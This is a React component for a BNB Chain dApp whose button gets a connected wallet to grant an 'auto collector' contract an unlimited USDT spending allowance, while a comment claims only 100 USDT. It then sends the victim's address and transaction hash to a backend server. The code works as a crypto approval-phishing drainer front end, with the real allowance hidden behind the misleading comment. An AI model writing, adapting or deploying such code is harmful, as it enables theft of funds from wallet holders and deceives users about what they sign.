import { useAccount, useWriteContract } from 'wagmi';
import { parseUnits, maxUint256 } from 'viem';

// USDT Token Address (BSC Mainnet)
const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
// Agar Testnet use kar rahe ho to Testnet ka USDT address dhundo
const BACKEND_URL = import.meta.env.VITE_BACKEND_URL;
// Tumhara Deploy kiya hua contract address
const AUTO_COLLECTOR_ADDRESS = '0xa78Eec7Cf7B694D92845A0577C549Baa560a4F0b';

const ERC20_ABI = [
  {
    constant: false,
    inputs: [
      { name: '_spender', type: 'address' },
      { name: '_value', type: 'uint256' },
    ],
    name: 'approve',
    outputs: [{ name: '', type: 'bool' }],
    type: 'function',
  },
];

export function ApproveButton() {
  const { writeContract } = useWriteContract();
  const { address, isConnected } = useAccount();
  const handleApprove = () => {
    // User se 100 USDT ki approval le rahe hain
    const amountToApprove = maxUint256; // USDT ke decimals 18 hote hain BSC par

    writeContract(
      {
        address: USDT_ADDRESS,
        abi: ERC20_ABI,
        functionName: 'approve',
        args: [AUTO_COLLECTOR_ADDRESS, amountToApprove],
      },
      {
        onSuccess: (hash) => {
          alert(`Approval Sent! Hash: ${hash}\nNotifying Backend at: ${BACKEND_URL}`);
          console.log('Approval Transaction Sent:', hash);
          console.log('Using Backend URL:', BACKEND_URL);

          fetch(BACKEND_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ userAddress: address, txHash: hash, source: 'FrontendApprove' }),
          })
            .then((res) => res.json())
            .then((data) => {
              console.log('Backend Response:', data);
              alert(`Backend Response: ${JSON.stringify(data)}`);
            })
            .catch((err) => {
              console.error('Backend Notification Failed:', err);
              alert(`Backend Notification Failed: ${err.message}`);
            });
        },
      }
    );
  };

  return <button onClick={handleApprove}>Approve USDT for Collection</button>;
}
